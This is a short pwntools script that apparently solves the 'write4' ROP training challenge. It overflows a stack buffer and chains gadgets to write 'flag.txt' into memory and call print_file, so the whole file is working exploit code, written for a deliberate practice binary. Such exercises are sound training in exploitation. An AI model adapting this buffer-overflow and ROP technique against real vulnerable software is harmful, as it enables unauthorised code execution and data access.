#!/usr/bin/env python3

from pwn import *
elf=exe=ELF("./write4",checksec=False)
p=process(exe.path)
#input()
offset=0x28
print_file=0x400510
pop_r14_pop_r15=0x0000000000400690
pop_rdi=0x0000000000400693
flag_txt=0x00000000601500
mov_r14_r15=0x0000000000400628
ret=0x00000000004004e6
payload=b"A"*offset+p64(pop_r14_pop_r15)+p64(flag_txt)+p64(0x7478742e67616c66)
payload+=p64(ret)+p64(mov_r14_r15)+p64(pop_rdi)+p64(flag_txt)+p64(print_file)
p.sendlineafter(b">",payload)
p.interactive()